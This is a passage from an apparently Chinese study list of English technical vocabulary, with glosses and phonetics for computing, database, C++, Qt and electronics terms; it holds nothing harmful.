style="color:#fe2c24;">redundant</span>，&nbsp;[rɪˈdʌndənt]多余的，累赘的；被解雇的，被裁员的；</p>  <p>communicate传递信息，通讯；传达，传递（想法或感情）</p>  <p>segment，段；部分，片段；</p>  <p>startup，启动</p>  <p>build，有的地方做构建使用，即编译链接全过程</p>  <p>batch，批处理</p>  <p><span style="color:#fe2c24;">cursor</span>，&nbsp;[ˈkɜːrsər]光标</p>  <p><span style="color:#fe2c24;">white space</span>，空格</p>  <p><span style="color:#fe2c24;">optimize</span>，[ˈɑːptɪmaɪz]优化</p> </blockquote> <p><strong>LINUX篇</strong></p> <blockquote>  <p>CPU，中央处理单元</p>  <p>GPU，图形处理器</p>  <p>graphic详细的，生动的；绘画的；图形的，图示的；</p>  <p>ALU，算术逻辑单元</p>  <p>RAM/ROM</p>  <p>UPS，Uninterrupted Power Supply不间断电源</p>  <p>BIOS，基本输入输出系统</p>  <p>OS，操作系统</p>  <p>GUI，图形用户界面</p>  <p>C/S，客户端/服务器模式</p>  <p>B/S，浏览器/服务器模式</p>  <p>GNU，通用公共许可证</p>  <p>Open Source，开源</p>  <p>ISO，国际标准化组织</p>  <p>standard&nbsp;[ˈstændərd]（品质的）标准，水平，规范；正常的水平，应达到的标准；行为标准，道德水准（standards）；普通的，标准的；</p>  <p>version，版本</p>  <p>screen，屏幕</p>  <p><span style="color:#fe2c24;">kernel</span>，&nbsp;[ˈkɜːrn(ə)l]坚果可食用的）仁，核；玉米粒；计算机操作系统的）核心程序，内核</p>  <p><span style="color:#fe2c24;">shell</span>，&nbsp;[ʃel]（蛋、坚果、某些种子和某些动物的）壳，命令解释器</p>  <p>packet，数据包</p>  <p>performance，性能</p>  <p>paste，粘贴</p>  <p><span style="color:#fe2c24;">clipboard</span>，&nbsp;[ˈklɪpbɔːrd]剪切板，剪贴板</p>  <p>replace，替换</p>  <p>undo，撤销</p>  <p>redo，重做</p>  <p>refresh，刷新</p>  <p>floppy松散下垂的，耷拉的;&nbsp;软磁盘，软盘</p>  <p>floppy disk，软盘</p>  <p>hard disk，硬盘</p>  <p><span style="color:#fe2c24;">mainboard</span>，['meinbɔ:d]主板</p>  <p><span style="color:#fe2c24;">monitor</span>，&nbsp;[ˈmɑːnɪtər]监视器，显示屏</p>  <p>keyboard，键盘</p>  <p>mouse，鼠标</p>  <p>wizard，巫师，术士；能手，奇才；向导程序</p>  <p>configuration，配置</p>  <p>document，文档</p>  <p>interface，接口</p>  <p>active，激活</p>  <p>terminal，终端</p>  <p>console，[kənˈsoʊl]控制台,仪表盘；</p>  <p>router，路由</p>  <p>switch，交换机</p>  <p>firewall，防火墙</p>  <p>process，进程</p>  <p>thread，（计算机）线程，调度单位;线；细线，线状物；思路，贯穿的主线；</p>  <p>engineer，工程师</p>  <p>program，程序</p>  <p>destination，目的地</p>  <p>remote，远程</p>  <p>paragraph，段落</p>  <p>symbol，标志，符号</p>  <p>virus，病毒</p>  <p>pipe，管道</p>  <p>fifo，命名管道</p>  <p>socket，[ˈsɑːkɪt]（电源）插座；（电器）插口，插孔；套接字</p>  <p><span style="color:#fe2c24;">authentication</span>，[ɔːˌθentɪˈkeɪʃn]证明，认证，鉴定</p>  <p><span style="color:#fe2c24;">authentic&nbsp;</span>&nbsp;[ɔːˈθentɪk]真正的;真实的;真品的;真迹的;逼真的</p>  <p>access入口，通道；获得的机会，使用权；（对计算机存储器的）访问，存取；</p>  <p><span style="color:#fe2c24;">accessory</span>，[əkˈsesəri]附件，配件；装饰品，配饰；辅助的，副的；附属的；</p>  <p>attachment附加设备，附属物；（邮件）附件；文件附件；喜欢，依恋；</p>  <p>specific，细节，详情；明确的，具体的；特定的；特有的，独特的；</p>  <p>combination，[ˌkɑːmbɪˈneɪʃ(ə)n]结合</p>  <p><span style="color:#fe2c24;">concurrency</span>，[kənˈkɜːrənsi]并发性，同时发生</p>  <p>concurrent，并存的，同时发生的；</p>  <p>parallel access，并行访问</p>  <p>parallel 平行的；相似的，同时发生的；（计算机）并行的；并联的</p>  <p>increment，增长</p>  <p><span style="color:#fe2c24;">truncate</span>，&nbsp;[ˈtrʌŋkeɪt]截断</p>  <p>solution，解决方案</p>  <p>resource，资源</p>  <p><span style="color:#fe2c24;">notation</span>，&nbsp;[noʊˈteɪʃn]（音乐、数学等的）标记系统，成套符号，标记法；注释，评注</p>  <p><span style="color:#fe2c24;">particular</span>，&nbsp;[pərˈtɪkjələr]特有的</p>  <p>assume，假定</p>  <p>distribute，分配</p>  <p>file descriptor，文件描述符</p>  <p>describe描述，形容；</p>  <p>description描述，形容，说明；</p>  <p>descriptor描述符号</p>  <p>standard input，标准输入</p>  <p>standard&nbsp;output，标准输出</p>  <p>standard error，标准错误</p>  <p><span style="color:#fe2c24;">convention</span>，&nbsp;[kənˈvenʃ(ə)n]习俗，惯例，约定</p>  <p><span style="color:#fe2c24;">redirect</span>，&nbsp;[ˌriːdəˈrekt]重定向</p>  <p>direct径直的，笔直的；坦率的；直射的；直接的;给……指路；指引，引导；</p>  <p>direction方向，方位；趋势，动向；</p>  <p>provide，提供</p>  <p>instance，例子，实例</p>  <p>instant立刻的，马上的；速食的，即食的；紧急的，紧迫的；</p>  <p>guarantee，确保，保证；担保，为……作保；保修，包换</p>  <p>obtain，（尤指通过艰难的过程）得到，获得；</p>  <p><span style="color:#fe2c24;">supplementary</span>，&nbsp;[ˌsʌplɪˈmentri]附属，补充的，附加的；</p>  <p>notify，通知，通告</p>  <p>notice,注意；留意；通知，通告</p>  <p>announce，宣布;宣告(决定、计划等);(尤指通过广播)通知;声称;宣称;</p>  <p><span style="color:#fe2c24;">denote</span>，[dɪˈnoʊt]表示，指示</p>  <p><span style="color:#fe2c24;">terminate</span>，&nbsp;[ˈtɜːrmɪneɪt]结束，终止</p>  <p>terminal（火车、公共汽车或船的）终点站；电脑终端；（电路的）端子，线接头；（疾病） 致命的，不治的，晚期的；学期的，期末的</p>  <p><span style="color:#fe2c24;">primitive</span>，&nbsp;[ˈprɪmətɪv]原始的，远古的</p>  <p>calendar，[ˈkælɪndər]日历</p>  <p><span style="color:#fe2c24;">scheme&nbsp;</span>&nbsp;[skiːm]&lt;英&gt;（政府或其他组织的）计划，方案；</p>  <p><span style="color:#fe2c24;">schedule</span>,&nbsp;[ˈskedʒuːl]计划（表），进度表；&lt;美&gt;（公共汽车、火车等的）时间表；（电视或电台的）节目表；&lt;美&gt;（学校的）课程表；</p>  <p><span style="color:#fe2c24;">implementation</span>，&nbsp;[ˌɪmplɪmenˈteɪʃ(ə)n]实现，履行</p>  <p>recent，最近的</p>  <p>technique，技术，技巧</p>  <p>technology，[tekˈnɑːlədʒi]科技，技术；技术设备，先进机器；</p>  <p><span style="color:#fe2c24;">invoke</span>，[ɪnˈvoʊk]行使，实施（法权）；（计算机）调用，激活；</p>  <p>discussion，讨论，议论</p>  <p>examine，&nbsp;[ɪɡˈzæmɪn]v检查，说明，考核，测验；（医生）诊察；</p>  <p>exam,n考试；试卷；&lt;美&gt;医学检查</p>  <p><span style="color:#fe2c24;">associate</span>，&nbsp;[əˈsoʊsieɪt]关联，联合;联合的，有关连的;同事，伙伴；副职，副手；副的</p>  <p>nevertheless，然而，尽管如此</p>  <p>permission，许可，权限</p>  <p>generate，产生，发生</p>  <p>possibly，可能，也许</p>  <p>across，穿过</p>  <p>reposition，使复位；改变……的位置；复位；</p>  <p>position&nbsp;位置，地点；恰当位置，正确位置；</p>  <p>completion，完成，实现</p>  <p>complete使完整，使完美；填写（表格）；完成，结束;完全的，彻底的；全部的，完整的；完成的，结束的；</p>  <p>measure，测量</p>  <p>indeed，确实，实在</p>  <p><span style="color:#fe2c24;">facility</span>，&nbsp;[fəˈsɪləti]设施，设备</p>  <p>instead，代替，反而</p>  <p>feature，特点，特征</p>  <p>atomic，原子的</p>  <p>regular，规则</p>  <p><span style="color:#fe2c24;">additional</span>，&nbsp;[əˈdɪʃən(ə)l]附加的</p>  <p><span style="color:#fe2c24;">duplicate</span>，&nbsp;[ˈduːplɪkeɪt]复制，复制品</p>  <p><span style="color:#fe2c24;">interchangeably</span>，&nbsp;[ˌɪntərˈtʃeɪndʒəbli]可交换的</p>  <p><span style="color:#fe2c24;">category</span>，&nbsp;[ˈkætəɡɔːri]种类</p>  <p>sticky，粘性的</p>  <p>predate，[ˌpriːˈdeɪt]在日期上早于（先于）</p>  <p>damand，需求，需要</p>  <p><span style="color:#fe2c24;">contiguous</span>，&nbsp;[kənˈtɪɡjuəs]连续的，临近的;接触的</p>  <p><span style="color:#fe2c24;">portion</span>，&nbsp;[ˈpɔːrʃ(ə)n]部分，一份，一部分</p>  <p>partial，[ˈpɑːrʃ(ə)l]部分的</p>  <p>correspond，符合，一致</p>  <p><span style="color:#fe2c24;">recursive</span>，&nbsp;[rɪˈkɜːrsɪv]递归的，循环的</p>  <p>chop，（用斧或刀）砍，剁；（用斧子等工具）砍伐（树木）；截断</p>  <p>concept，概念，观点</p> </blockquote> <p><strong>数据结构篇</strong></p> <blockquote>  <p>data structure，数据结构</p>  <p>data abstraction，数据抽象</p>  <p>abstract&nbsp;抽象的，纯概念的；（艺术）抽象派的；理论上的</p>  <p>attract,[əˈtrækt]吸引；（物体间）产生引力；引起；有吸引力</p>  <p>data element，数据元素</p>  <p>element&nbsp;基本部分，要素；元素；</p>  <p>data object，数据对象</p>  <p>data item，数据项</p>  <p>data type，数据类型</p>  <p>logical structure，逻辑结构</p>  <p>physical structure，物理结构</p>  <p>linear structure，线性结构</p>  <p>nonlinear structrue，非线性结构</p>  <p>linear&nbsp;list，线性表</p>  <p>linked&nbsp;list，链表</p>  <p>linear&nbsp;linked&nbsp;list，线性链表</p>  <p>single&nbsp;linked&nbsp;list，单链表</p>  <p>circular&nbsp;linked&nbsp;list，循环链表</p>  <p>circle圆，圆形物；圈子;循环，周期</p>  <p>circular&nbsp;圆形的，环形的；循环的</p>  <p>head node，头结点</p>  <p>head pointer，头指针</p>  <p>tail pointer，尾指针</p>  <p>tail （动物的）尾巴；</p>  <p>rear（尤指建筑物或车辆等的）后部，背部;后方的，背部的</p>  <p>dictionary，词典，字典</p>  <p>sort，排序</p>  <p>search，搜寻，查找</p>  <p>update，更新</p>  <p>insert，插入</p>  <p>delete，删除</p>  <p><span style="color:#fe2c24;">predecessor</span>，[ˈpredəsesər]前驱</p>  <p><span style="color:#fe2c24;">successor</span>，&nbsp;[səkˈsesər]后继,继承者，接替的事物；（组织、机器等的）接替物</p>  <p>succession&nbsp;连续不断的人（物）；继任，继承，继承权；交替，更迭；</p>  <p>a succession of一连串;一系列;一系列的;一连串的;一串串</p>  <p>success，n成功，胜利；发财，成名；成功的人（或事物）</p>  <p>succeed，v. 成功，达成；（学业、事业或其他活动）表现出色，有作为；</p>  <p>successful成功的，如愿以偿的；事业有成的，飞黄腾达的；</p>  <p>stack，栈</p>  <p>push，推，压</p>  <p>pop，弹出</p>  <p>pop，流行音乐的；通俗的，大众的</p>  <p>bottom，栈底</p>  <p>top，栈顶</p>  <p><span style="color:#fe2c24;">queue</span>，&nbsp;[kjuː]队列；&lt;英&gt;排队（等候）；（计算机）排成队列，排队</p>  <p>front，队头</p>  <p>rear，队尾</p>  <p>first-in-first-out list，队列</p>  <p>last-in-first-out&nbsp;list，栈</p>  <p>tree，树</p>  <p>subtree，子树</p>  <p>forest，森林</p>  <p>root，根</p>  <p>leaf，叶子</p>  <p>node，节点</p>  <p>depth，深度</p>  <p>level，层次</p>  <p>parents，双亲</p>  <p>children，孩子</p>  <p>brother，兄弟</p>  <p>ancestor，祖先</p>  <p><span style="color:#fe2c24;">descendant</span>，[dɪˈsendənt]后裔，子孙；派生物，衍生物</p>  <p>binary tree，二叉树</p>  <p>huffman tree，哈夫曼树</p>  <p>ordered tree，有序树</p>  <p>unordered tree，无序树</p>  <p><span style="color:#fe2c24;">traversal </span>of tree，[trəˈvərs(ə)l]树的遍历</p> </blockquote> <p><strong>数据库篇</strong></p> <blockquote>  <p>net，捕获，捕捉;网，网状物；因特网；球网，球门网；广播网，通讯网；安全网；</p>  <p>database，数据库</p>  <p>column，圆柱，纪念柱；柱状物；纵队，纵行（列）；（报纸、杂志上的）栏；（报纸或杂志的）专栏（文章）</p>  <p>source，根源</p>  <p>select，选择，挑选</p>  <p>limit，限制，界限</p>  <p>concat，合并多个数组，合并多个字符串（是一个函数名，不是英文）</p>  <p><span style="color:#fe2c24;">concatenate</span>，&nbsp;[kənˈkæt(ə)nˌeɪt]连接，连结；使连锁，连接的，连结的，连锁的</p>  <p>contact联系，联络；接触，触摸；</p>  <p>temporary，短暂的，临时的</p>  <p>alter，改变，更改</p>  <p>alternative可供选择的事物，替代物;可替代的，备选的；</p>  <p>index，索引，标志</p>  <p>enum，&nbsp;[ˈenəm]计算，枚举</p>  <p><span style="color:#fe2c24;">optimize</span>，&nbsp;[ˈɑːptɪmaɪz]使完善，使优化</p>  <p>analyse，分析</p>  <p>analysis,分析；化验分析；心理分析，精神分析；分析报告</p>  <p>statistic,统计资料;统计学;统计数字;(一项)统计数据</p>  <p>procedure，程序，手续，步骤</p>  <p>path，路径</p>  <p>admin，管理，行政</p>  <p><span style="color:#fe2c24;">grant</span>，&nbsp;[ɡrænt]授予，给予；承认</p>  <p>insert，插入</p>  <p>update，更新</p>  <p>show，展示，显示</p>  <p>host，主机，主人</p>  <p>status，状态，地位</p>  <p>state状态，状况；身体（或精神）状况；陈述，说明；</p>  <p>statue（石或金属做的动物或人的）雕像</p>  <p>customer，顾客</p>  <p>drop，下降，漏掉</p>  <p>rename，重命名</p>  <p>dump，（内存信息）转储，转存;丢弃，扔掉；乱堆，乱放；丢下，抛弃；</p>  <p>damp潮湿的,湿气，潮气；沼气；</p>  <p>lamp灯，光源；照明，照亮；</p>  <p>commit，犯（罪、错）；承诺</p>  <p>load，加载，负荷，负载</p>  <p>force，强制</p>  <p>create，创造，创建</p>  <p>config，配置</p>  <p>mount，登上，上升</p>  <p>version，版本</p>  <p>username，用户名</p>  <p>shutdown，关机</p>  <p>parameter，参数</p>  <p>owner，所有者，物主</p>  <p>nologging，无登记，无记录</p>  <p>system，系统，体系</p>  <p>session，会议，一段时间</p>  <p>section，段，部分；散件，部件；</p>  <p>rebuild，重建，恢复</p>  <p>mode，模式，风格</p>  <p>logfile，日志文件</p>  <p><span style="color:#fe2c24;">archive</span>，[ˈɑːrkaɪv]档案文件，存档</p>  <p>achieve，[əˈtʃiːv]（经努力）达到，取得，实现；获得成功</p>  <p>achievement成绩，成就；完成，实现；</p>  <p>achievable可达到的;可获得的;可以实现的</p>  <p>content，内容，目录；满足的，满意的</p>  <p>context，上下文，语境;背景，环境；</p>  <p><span style="color:#fe2c24;">backup</span>，&nbsp;[ˈbækʌp]备份，拷贝</p>  <p>scope，范围</p>  <p>record，记录</p> </blockquote> <p><strong>C++篇</strong></p> <blockquote>  <p>using，使用</p>  <p>namespace，命名空间</p>  <p><span style="color:#fe2c24;">alias</span>，[ˈeɪliəs]别名，化名</p>  <p>inline，内联</p>  <p>default，默认，缺省</p>  <p><span style="color:#fe2c24;">anonymous</span>，[əˈnɑːnɪməs]匿名的</p>  <p><span style="color:#fe2c24;">ambiguous</span>，[æmˈbɪɡjuəs]不明确的，引起歧义的</p>  <p><span style="color:#fe2c24;">initialize</span>，&nbsp;[ɪˈnɪʃəlaɪz]初始化</p>  <p><span style="color:#fe2c24;">architecture</span>，[ˈɑːrkɪtektʃər]建筑设计，建筑风格；建筑学；结构；计算机的体系结构，架构</p>  <p><span style="color:#fe2c24;">structure</span>，&nbsp;[ˈstrʌktʃər]结构，构造；结构体</p>  <p><span style="color:#fe2c24;">construct</span>，&nbsp;[kənˈstrʌkt]建筑;修建;建造;组成;创建;</p>  <p>construction，建设;施工;建筑;建造;</p>  <p>match，匹配</p>  <p><span style="color:#fe2c24;">predicate</span>，&nbsp;[ˈpredɪkət]断言，断定</p>  <p><span style="color:#fe2c24;">predict</span>，&nbsp;[prɪˈdɪkt]预测;预言;预报;预告</p>  <p>prediction，预言;预测;预告</p>  <p>callable，（计算机）可调用的</p>  <p>chain，链子，连锁</p>  <p>string，字符串；线，细绳；一连串，一系列（事件）；</p>  <p>append，附加，添加，追加</p>  <p>reference，引用</p>  <p>pass，传递</p>  <p>overview，回顾，复习</p>  <p><span style="color:#fe2c24;">review</span>，&nbsp;[rɪˈvjuː]审查，检查；&lt;美&gt;复习，温习；</p>  <p><span style="color:#fe2c24;">revise</span>，&nbsp;[rɪˈvaɪz]改变，修正；修改，修订（书刊、估算等）&lt;英&gt;温习，复习</p>  <p><span style="color:#fe2c24;">inspect</span>，&nbsp;[ɪnˈspekt]检查，审视；检阅，视察；进行检查，进行视察</p>  <p>invalidate，驳斥，证明是谬误的；使无效，使作废</p>  <p>scope，范围，领域；视野，眼界；观测仪器（如望远镜、显微镜等）</p>  <p><span style="color:#fe2c24;">literal</span>，[ˈlɪtərəl]字面的，原义的</p>  <p>literature文学，文学作品</p>  <p><span style="color:#fe2c24;">manipulate</span>，[məˈnɪpjuleɪt]操纵，操作</p>  <p><span style="color:#fe2c24;">manipulation </span>&nbsp;[məˌnɪpjuˈleɪʃn]操作，控制</p>  <p>machine，机器，机械（装置）</p>  <p>mechanism机械装置，机件；途径，方法；（生物体内的）机制，构造；</p>  <p>mechanic机械工，机修工；</p>  <p>design，设计</p>  <p>nested，嵌套的</p>  <p>local，当地的，地方的；局部的；</p>  <p>class，类</p>  <p>object，目标，对象</p>  <p>instance，实例</p>  <p>private，私有的</p>  <p>public，公开的</p>  <p>protected，受保护的</p>  <p>construct，构造</p>  <p><span style="color:#fe2c24;">destruct</span>，[dɪˈstrʌkt]析构，破坏</p>  <p>access，入口，访问</p>  <p><span style="color:#fe2c24;">accessible</span>，&nbsp;[əkˈsesəb(ə)l]可访问的</p>  <p>overload，重载</p>  <p>overwrite，重写</p>  <p>control，控制</p>  <p><span style="color:#fe2c24;">derivation</span>，&nbsp;[ˌderɪˈveɪʃn]起源，由来；派生，衍生</p>  <p>derived，衍生的</p>  <p>drive驾车送（人）；迫使，驱使；驱赶</p>  <p><span style="color:#fe2c24;">inheritance</span>，&nbsp;[ɪnˈherɪtəns]继承，遗传</p>  <p><span style="color:#fe2c24;">inherit，</span>&nbsp;[ɪnˈherɪt]继承（遗产）；经遗传获得（品质、身体特征等）；接手，承担；</p>  <p>base，基础，基地</p>  <p>destroy，摧毁，销毁</p>  <p>abstract，抽象的</p>  <p>virtual，虚拟的</p>  <p><span style="color:#fe2c24;">dynamic</span>，&nbsp;[daɪˈnæmɪk]充满活力的，精力充沛的；动态的</p>  <p><span style="color:#fe2c24;">operator</span>，&nbsp;[ˈɑːpəreɪtər]运算符</p>  <p>try，尝试</p>  <p>final，最终的，最后的</p>  <p>list，目录，列表</p>  <p>specifier，区分符，分类符</p>  <p><span style="color:#fe2c24;">alternative</span>，&nbsp;[ɔːlˈtɜːrnətɪv]替代的</p>  <p><span style="color:#fe2c24;">sequential</span>，&nbsp;[sɪˈkwenʃ(ə)l]连续的，按顺序的；依次发生的，相继发生的；（主计算机）顺序的</p>  <p>sequence，顺序，次序；连续事件（或动作、事物）；</p>  <p>sequent，连续的，相继的；作为结果而产生的</p>  <p><span style="color:#fe2c24;">subsequent</span>，&nbsp;[ˈsʌbsɪkwənt]随后的，接着的；</p>  <p>subsequence，随后；接着（尤指结果、效果）</p>  <p>friendship，友谊</p>  <p>hidden，隐藏的</p>  <p>complete，完整的</p>  <p>reset，重置</p>  <p><span style="color:#fe2c24;">signature</span>，&nbsp;[ˈsɪɡnətʃər]签名，标志</p>  <p>sign，指示牌，标志；迹象，征兆；示意动作，手势；暗号，信号；签名，署名；（与机构、公司等）签约；示意，打手势</p>  <p>template，模板</p>  <p>temper，坏脾气，暴躁脾气；心情，情绪；怒气，火气</p>  <p>temple，庙宇，寺院；太阳穴，鬓角</p>  <p>exception，例外，异常</p>  <p>expect期待；预计；要求，指望；认为；</p>  <p>typename，类别名</p>  <p><span style="color:#fe2c24;">conversion</span>，[kənˈvɜːrʒ(ə)n]转换</p>  <p><span style="color:#fe2c24;">convert</span>&nbsp;[kənˈvɜːrt]（使）转变，（使）转换；（使）改变信仰，（使）皈依；</p>  <p><span style="color:#fe2c24;">conversation&nbsp;</span>&nbsp;[ˌkɑːnvərˈseɪʃ(ə)n]（非正式的）谈话，交谈；</p>  <p>runtime，运行时间</p>  <p><span style="color:#fe2c24;">explicit</span>，[ɪkˈsplɪsɪt]明确的</p>  <p>outside，在外面</p>  <p><span style="color:#fe2c24;">deduction</span>，&nbsp;[dɪˈdʌkʃ(ə)n]演绎，推论；扣除，扣除额</p>  <p>deduct，减去，扣除</p>  <p>detect，查明，察觉；测出，检测，识别</p>  <p><span style="color:#fe2c24;">detection</span>，&nbsp;[dɪˈtekʃ(ə)n]察觉，发现；侦破（案件）</p>  <p>reduce，减少，降低；</p>  <p>reduction，减小，降低；减价，折扣；</p>  <p>separate，分开，分离</p>  <p>compound，复合物</p>  <p><span style="color:#fe2c24;">delegate</span>，&nbsp;[ˈdelɪɡət]代表</p>  <p>dedicate</p>  <p>delicate</p>  <p>promotion，提拔，晋升；促销，推销； 促进，提倡；</p>  <p>random，任意的，随机的，胡乱的</p>  <p>console，控制台</p>  <p>buffer，缓冲区</p>  <p>disk，硬盘</p>  <p>occur，发生，出现</p>  <p>state，状态</p>  <p><span style="color:#fe2c24;">encounter</span>，&nbsp;[ɪnˈkaʊntər]遭遇</p>  <p>clear，清除</p>  <p>mode，模式</p>  <p>formatted，有格式的</p> </blockquote> <p><strong>QT篇</strong></p> <blockquote>  <p><span style="color:#fe2c24;">deploy</span>，&nbsp;[dɪˈplɔɪ]部署，调度；利用</p>  <p>employ雇用；使用，利用；忙于，从事</p>  <p>comply遵从，服从；（商品）符合特定标准</p>  <p>project，项目，工程</p>  <p>application，应用程序</p>  <p>widget，&nbsp;[ˈwɪdʒɪt]窗口，部件,装饰物；小机械；小部件；</p>  <p>untitled，无标题的</p>  <p>dialog，对话框</p>  <p>location，位置</p>  <p>kit，工具包;成套工具，成套设备；配套元件；</p>  <p>detail，详细信息</p>  <p>target，目标</p>  <p>template，模板</p>  <p>headers，标头</p>  <p>button，按钮</p>  <p>label，标签</p>  <p>icon，图标</p>  <p>unicode，统一字符标准</p>  <p>connect，连接</p>  <p>sender，发送者</p>  <p>receiver，接收者</p>  <p><span style="color:#fe2c24;">slot</span>，&nbsp;[slɑːt]槽</p>  <p>signal，信号</p>  <p>click，点击</p>  <p>release，释放，放走；排放，泄漏；发行;公开，发布；公映；</p>  <p>check，检查</p>  <p>form，表单;形状，外形；体形；（存在的）形态，形式；</p>  <p>developer，开发者</p>  <p>provided，提供</p>  <p><span style="color:#fe2c24;">simplify</span>，&nbsp;[ˈsɪmplɪfaɪ]简化</p>  <p>active，活动的</p>  <p><span style="color:#fe2c24;">directory</span>，&nbsp;[dəˈrektəri]目录</p>  <p>control，控制</p>  <p>configuration，配置，组态</p>  <p>identify，识别</p>  <p>element，元素，要素</p>  <p>example，例子</p>  <p>command，命令</p>  <p>chapter，章节</p>  <p>method，方法</p>  <p>implement，实现</p>  <p>custom，自定义</p>  <p>feature，特性，特征</p>  <p>assistant，助理</p>  <p>license，许可证</p>  <p>licence，许可证;执照;</p>  <p>relate，关系</p>  <p><span style="color:#fe2c24;">layout</span>，&nbsp;[ˈleɪaʊt]布局，设计；版面编排，版面设计；</p>  <p>style，风格，样式</p>  <p>model，模型</p>  <p>view，视图</p>  <p>description，描述</p>  <p>member，成员</p>  <p>search，查找</p> </blockquote> <p><strong>Makefile</strong></p> <blockquote>  <p>archive，档案文件; 档案</p>  <p><span style="color:#fe2c24;">prerequisite</span>，[ˌpriːˈrekwəzɪt]先决条件; 前提; 必备条件</p> </blockquote> <p><strong>其他</strong></p> <blockquote>  <p>Confidentiality: Customer Non-confidential，保密：客户非保密</p>  <p><span style="color:#fe2c24;">Confidentiality</span>，[ˌkɑːnfɪˌdenʃiˈæləti]保密性，机密性</p>  <p><span style="color:#fe2c24;">confidential&nbsp;</span>[ˌkɑːnfɪˈdenʃ(ə)l]机密的，保密的；</p>  <p>confident，（性格，态度）自信的，充满信心的；坚信的，肯定的</p>  <p>confidence，自信，信心；信任，信赖；把握，肯定；保密，机密；秘密，知心话</p>  <p>symptom，（医） 症状；（大问题的）迹象，征兆，征候</p>  <p><span style="color:#fe2c24;">violation</span>，&nbsp;[ˌvaɪəˈleɪʃ(ə)n]（对法律、协议、原则等的）违背，违反；侵权行为，（对人权的）侵犯； （对某物的）损毁，（对圣地的）亵渎；强奸</p>  <p><span style="color:#fe2c24;">violate</span>，&nbsp;[ˈvaɪəleɪt]违反，违背；侵犯，打扰；亵渎，损毁（神圣之地等）</p>  <p><span style="color:#fe2c24;">isolate</span>，&nbsp;[ˈaɪsəleɪt]孤立，分离；隔离；孤独的，孤立的</p>  <p><span style="color:#fe2c24;">revoke</span>，&nbsp;[rɪˈvoʊk]撤销</p>  <p>prevent，防止、阻止</p>  <p>Dialog，对话</p>  <p><span style="color:#fe2c24;">lattice</span>，&nbsp;[ˈlætɪs][晶体] 晶格；格子;点阵</p>  <p><span style="color:#fe2c24;">shortcut</span>，&nbsp;[ˈʃɔːrtkʌt]快捷方式</p>  <p>parameter是形参</p>  <p><span style="color:#fe2c24;">argument&nbsp;</span>&nbsp;[ˈɑːrɡjumənt]是实参<br> brief 简介<br> note 注意事项</p>  <p>duplicate，副本，复制</p>  <p><span style="color:#fe2c24;">priority </span>&nbsp;[praɪˈɔːrəti]时间优先权<br><span style="color:#fe2c24;">precedence </span>&nbsp;[ˈpresɪdəns]地位等的优先权<br> proceed 继续<br> process 进程<br><span style="color:#fe2c24;">algorithm </span>[ˈælɡərɪðəm]算法，计算程序</p>  <p><span style="color:#fe2c24;">parse</span>，&nbsp;[pɑːrs](对句子)作语法分析;作句法分析</p>  <p>phase，[feɪz]（发展或变化的）阶段，时期</p>  <p>phrase，[freɪz]短语;词组;成语;习语;惯用法;警句;乐句;乐节</p>  <p>context，语境，上下文</p>  <p>content，内容，目录</p>  <p>Intrinsic，[ɪnˈtrɪnzɪk]内在的，固有的；内部函数</p>  <p>exclusive lock互斥锁</p>  <p><span style="color:#fe2c24;">exclusive</span><span style="color:#0d0016;">，</span>&nbsp;[ɪkˈskluːsɪv]独有的，专用的；高档的，昂贵的；排外的；排斥的；独家新闻，独家报道</p>  <p><span style="color:#fe2c24;">Dhrystone</span>，是测量处理器运算能力的最常见基准程序之一，常用于处理器的整型运算性能的测量</p>  <p><span style="color:#fe2c24;">designator</span>，[ˌdezɪɡˈneɪtər]选择器、指示器、代号</p>  <p>compute 计算</p>  <p>formula 公式</p>  <p>export 输出</p> </blockquote> <hr> <h2 id="%E7%94%B5%E5%AD%90%E6%8A%80%E6%9C%AF%E4%B8%93%E4%B8%9A%E8%8B%B1%E8%AF%AD"><a name="t2"></a>电子技术专业英语</h2> <blockquote>  <p>advance&nbsp;前进，行进;(知识、技术等)发展，进步</p>  <p>advancement进步;发展;前进;促进;推动;晋升</p>  <p><span style="color:#fe2c24;">commerce，</span>[ˈkɑːmɜːrs]商业;商务;(尤指国际间的)贸易</p>  <p>commercial，[kəˈmɜːrʃ(ə)l]贸易的;商业的;赢利的;</p>  <p>commercially商业上；</p>  <p>instrument器械;仪器;器具;(车辆、机器的)仪器，仪表</p>  <p>device装置;设备</p>  <p><span style="color:#fe2c24;">amplifier&nbsp;</span>&nbsp;[ˈæmplɪfaɪər]放大器;扩音器;扬声器</p>  <p><span style="color:#fe2c24;">operational amplifier</span>运算放大器</p>  <p><span style="color:#fe2c24;">operational&nbsp;</span>&nbsp;[ˌɑːpəˈreɪʃən(ə)l]（机器、设备等）正常运转的，可使用的；</p>  <p>op amplifier运算放大器</p>  <p>amplification (n)扩大，增强；</p>  <p>amplify放大;增强(声音等)</p>  <p><span style="color:#fe2c24;">amplitude&nbsp;</span>&nbsp;[ˈæmplɪtuːd](声音、无线电波等的)振幅</p>  <p>operation操作、运算</p>  <p>Vacuum tube真空 管子</p>  <p>revolution革命;巨变;大变革</p>  <p>revolutionary革命性的;革命的;彻底变革的;</p>  <p><span style="color:#fe2c24;">resolution&nbsp;</span>&nbsp;[ˌrezəˈluːʃ(ə)n]决心，决定；<span style="color:#fe2c24;">分辨率</span></p>  <p><span style="color:#fe2c24;">definition&nbsp;</span>[ˌdefɪˈnɪʃn]释义，解释;定义;<span style="color:#fe2c24;">清晰度</span></p>  <p>convolution，[数] 卷积；回旋；盘旋；</p>  <p>resolve决心，决定</p>  <p>transistor晶体管</p>  <p>assemble（使）集合，（使）聚集；装配，组装</p>  <p>reassemble重新装配(或组装);重新集结;</p>  <p>assembly (n)装配;集会;议会;</p>  <p><span style="color:#fe2c24;">impedance&nbsp;</span>&nbsp;[ɪmˈpiːdns]阻抗</p>  <p>reactance电抗，感应抵抗</p>  <p>resistor电阻器</p>  <p>resistance电阻值；阻力；反对，抵制；抵抗，反抗；</p>  <p>resist抵制;阻挡;反抗;</p>  <p>resistive有抵抗力的；抗……的，耐……的；电阻的</p>  <p>persist持续；坚持，执意；</p>  <p>insist坚决要求，坚持；坚称</p>  <p><span style="color:#fe2c24;">capacitor</span>，[kəˈpæsɪtər]电容器</p>  <p><span style="color:#fe2c24;">capacity</span>，[kəˈpæsəti]容量;容积;&lt;电&gt;电容值</p>  <p>capable有能力的;有才能的;</p>  <p>capability能力;才能;(国家的)军事力量，军事武器</p>  <p><span style="color:#fe2c24;">inductor&nbsp;</span>&nbsp;[ɪnˈdʌktər]电感器</p>  <p>inductance电感值</p>  <p><span style="color:#fe2c24;">induct</span>，&nbsp;[ɪnˈdʌkt]引导；感应；使……就职；征召入伍</p>  